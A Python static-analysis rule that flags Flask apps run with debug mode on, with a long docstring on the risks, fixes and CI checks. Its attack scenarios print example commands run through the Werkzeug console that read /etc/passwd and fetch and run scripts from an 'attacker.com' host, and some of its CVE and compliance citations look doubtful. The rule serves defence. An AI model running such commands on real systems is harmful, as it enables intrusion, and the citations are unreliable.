"""
PYTHON-FLASK-001: Flask Debug Mode Enabled in Production

Security Impact: HIGH
CWE: CWE-489 (Active Debug Code)
CVE: CVE-2015-5306 (Werkzeug Debug PIN Bypass)
OWASP: A05:2021 - Security Misconfiguration

DESCRIPTION:
This rule detects Flask applications configured with debug mode enabled (debug=True). Running
Flask with debug mode in production exposes the interactive Werkzeug debugger, which allows
arbitrary code execution and exposes sensitive application internals.

WHAT IS FLASK DEBUG MODE:

When `debug=True` is set, Flask enables the Werkzeug interactive debugger. This provides:
- Interactive Python console in the browser on exceptions
- Automatic code reloading on file changes
- Detailed error pages with stack traces
- Access to application source code
- Environment variables and configuration

**In development**: These features are helpful for debugging.
**In production**: These features are CRITICAL SECURITY VULNERABILITIES.

SECURITY IMPLICATIONS:

**1. Remote Code Execution**:
The Werkzeug debugger provides an interactive Python shell accessible through the browser.
When an exception occurs, attackers can:
- Execute arbitrary Python code
- Access the filesystem
- Read environment variables (API keys, database passwords)
- Modify application state
- Establish reverse shells

**2. Information Disclosure**:
Debug mode exposes:
- Full source code paths
- Application structure
- Secret keys and tokens in stack traces
- Database connection strings
- Environment variables
- Internal network structure

**3. Debugger PIN Bypass** (CVE-2015-5306):
While the debugger is "protected" by a PIN, multiple bypasses have been found:
- PIN visible in console output (easily accessible on shared servers)
- PIN bruteforce attacks
- Time-based side channels
- Local file disclosure can reveal PIN generation algorithm

**4. Denial of Service**:
- Auto-reload feature can be triggered remotely
- Exception handlers consume excessive resources
- Attackers can intentionally trigger crashes

VULNERABLE EXAMPLE:
```python
from flask import Flask, request

app = Flask(__name__)

@app.route('/api/users')
def get_users():
    # Some application logic
    return {'users': [...]}

if __name__ == '__main__':
    # DANGEROUS: Debug mode enabled
    app.run(debug=True)  # Vulnerable!

# Also vulnerable:
# app.debug = True
# app.run()

# Or via config:
# app.config['DEBUG'] = True
```

**Attack scenario**:
1. Attacker triggers an exception (e.g., invalid input)
2. Werkzeug debugger appears with interactive console
3. Attacker enters Python code in the console
4. Attacker gains full application access

```python
# In Werkzeug console:
import os
os.system('cat /etc/passwd')  # Read system files
os.system('curl attacker.com/shell.sh | bash')  # Reverse shell
```

SECURE EXAMPLE:
```python
import os
from flask import Flask, request

app = Flask(__name__)

@app.route('/api/users')
def get_users():
    return {'users': [...]}

if __name__ == '__main__':
    # SAFE: Debug mode explicitly disabled
    app.run(debug=False)

    # BETTER: Use environment variable
    debug_mode = os.getenv('FLASK_DEBUG', 'False') == 'True'
    app.run(debug=debug_mode)

    # BEST: Don't set it at all (defaults to False)
    app.run()  # debug=False is the default
```

PRODUCTION DEPLOYMENT BEST PRACTICES:

**1. Use Production WSGI Server** (Recommended):
```python
# Don't use app.run() in production at all!
# Instead, use Gunicorn, uWSGI, or Waitress

# gunicorn_config.py
bind = "0.0.0.0:8000"
workers = 4
loglevel = "warning"  # Not "debug"
accesslog = "/var/log/flask/access.log"
errorlog = "/var/log/flask/error.log"

# Run with:
# gunicorn -c gunicorn_config.py myapp:app
```

**2. Environment-Based Configuration**:
```python
import os
from flask import Flask

app = Flask(__name__)

# Use environment variables for configuration
app.config['DEBUG'] = os.getenv('FLASK_ENV') == 'development'
app.config['TESTING'] = False

if __name__ == '__main__':
    # Only runs in local development
    if os.getenv('FLASK_ENV') == 'development':
        app.run(debug=True, host='127.0.0.1', port=5000)
    else:
        print("ERROR: Use a production WSGI server!")
        exit(1)
```

**3. Use Flask Configuration Classes**:
```python
class ProductionConfig:
    DEBUG = False
    TESTING = False
    SECRET_KEY = os.environ.get('SECRET_KEY')

class DevelopmentConfig:
    DEBUG = True  # Only for local development
    TESTING = True
    SECRET_KEY = 'dev-key-only'

# In application factory:
def create_app():
    app = Flask(__name__)

    if os.getenv('FLASK_ENV') == 'production':
        app.config.from_object(ProductionConfig)
    else:
        app.config.from_object(DevelopmentConfig)

    return app
```

**4. Docker/Container Deployment**:
```dockerfile
# Dockerfile
FROM python:3.11-slim

WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

# Never set FLASK_DEBUG=1 or FLASK_ENV=development here!
ENV FLASK_ENV=production

# Use production server
CMD ["gunicorn", "--bind", "0.0.0.0:8000", "app:app"]
```

DETECTION AND PREVENTION:

**Pre-deployment checks**:
```bash
# Scan Flask application for debug mode
pathfinder scan --project . --ruleset cpf/python/PYTHON-FLASK-001

# Automated CI/CD gate:
# .github/workflows/security.yml
- name: Check for Flask debug mode
  run: |
    pathfinder ci --project . --ruleset cpf/python/flask
    if [ $? -ne 0 ]; then
      echo "ERROR: Flask debug mode detected!"
      exit 1
    fi
```

**Code Review Checklist**:
- [ ] No `app.run(debug=True)` in codebase
- [ ] No `app.debug = True` assignments
- [ ] No `app.config['DEBUG'] = True` in production config
- [ ] Production uses WSGI server (Gunicorn, uWSGI)
- [ ] DEBUG configuration controlled by environment variables
- [ ] Docker images don't set FLASK_ENV=development

**Runtime Monitoring**:
```python
# Add startup check
from flask import Flask
import os

app = Flask(__name__)

if app.debug and os.getenv('FLASK_ENV') == 'production':
    raise RuntimeError("CRITICAL: Debug mode enabled in production!")
```

REAL-WORLD ATTACK EXAMPLES:

**1. Werkzeug Console RCE**:
```
1. Navigate to https://vulnerable-app.com/invalid-url (triggers 404 exception)
2. Werkzeug debugger appears with "Open an interactive Python shell"
3. Click console icon, enter PIN (or bypass)
4. Execute: __import__('os').system('wget attacker.com/backdoor.py')
5. Full application compromise
```

**2. Information Disclosure**:
```
# Stack trace reveals:
File "/app/config/database.py", line 23
  db_password = "P@ssw0rd123!ProductionDB"

# Attacker now has database credentials
```

**3. Source Code Exposure**:
```
# Debug page shows full source code:
@app.route('/admin/secret')
def admin_secret():
    api_key = "sk-live-abc123..."  # API key exposed
    ...
```

COMPLIANCE AND AUDITING:

**OWASP Top 10 A05:2021**:
> "Security Misconfiguration - Debug features enabled in production"

**CIS Flask Benchmark**:
> "Ensure debug mode is disabled in production environments"

**PCI DSS Requirement 6.5.10**:
> "Broken Authentication and Session Management - includes debug modes"

**NIST SP 800-53**:
CM-7: Least Functionality - "Remove or disable unnecessary functions"

**SOC 2 / ISO 27001**:
Requires separation of development and production environments

MIGRATION GUIDE:

**Step 1: Audit all Flask applications**:
```bash
# Find all app.run() calls
grep -rn "app.run(" --include="*.py"

# Find all debug=True
grep -rn "debug.*=.*True" --include="*.py"
```

**Step 2: Replace with environment-based config**:
```python
# BEFORE
app.run(debug=True, port=5000)

# AFTER
import os
debug = os.getenv('FLASK_DEBUG', 'False') == 'True'
app.run(debug=debug, port=5000)
```

**Step 3: Switch to production server**:
```bash
# Install Gunicorn
pip install gunicorn

# Run in production
gunicorn --workers 4 --bind 0.0.0.0:8000 myapp:app
```

**Step 4: Add CI/CD checks**:
```yaml
# .github/workflows/deploy.yml
- name: Verify no debug mode
  run: |
    if grep -r "debug=True" *.py; then
      echo "ERROR: Debug mode found!"
      exit 1
    fi
```

WERKZEUG DEBUGGER PIN:

Even with a PIN, the debugger is NOT safe:
- PIN visible in console output
- PIN can be bruteforced (only 6-8 digits)
- Multiple PIN bypass CVEs exist
- **NEVER rely on PIN as security!**

Correct approach: **Never enable debug mode in production. Period.**

REFERENCES:
- CWE-489: Active Debug Code (https://cwe.mitre.org/data/definitions/489.html)
- CVE-2015-5306: Werkzeug Debug PIN Bypass
- OWASP A05:2021 - Security Misconfiguration
- Flask Security Docs: https://flask.palletsprojects.com/en/stable/security/
- Werkzeug Documentation: https://werkzeug.palletsprojects.com/
- Production Flask Deployment: https://flask.palletsprojects.com/en/stable/deploying/

DETECTION SCOPE:
This rule uses simple pattern matching to detect app.run(debug=True) calls. It does not
require dataflow analysis as it's a configuration issue, not a data flow vulnerability.
"""

from rules.python_decorators import python_rule
from codepathfinder import calls, Or


@python_rule(
    id="PYTHON-FLASK-001",
    name="Flask Debug Mode Enabled",
    severity="HIGH",
    category="flask",
    cwe="CWE-489",
    cve="CVE-2015-5306",
    tags="python,flask,debug-mode,configuration,information-disclosure,owasp-a05,cwe-489,production,werkzeug,security,misconfiguration",
    message="Flask debug mode enabled. Never use debug=True in production. Use a production WSGI server like Gunicorn.",
    owasp="A05:2021",
)
def detect_flask_debug_mode():
    """
    Detects Flask applications with debug mode enabled.

    Matches:
    - app.run(debug=True)
    - *.run(debug=True)

    Example vulnerable code:
        app = Flask(__name__)
        app.run(debug=True)  # Detected!
    """
    # Use wildcard pattern to match any object's run method with debug=True
    return calls("*.run", match_name={"debug": True})
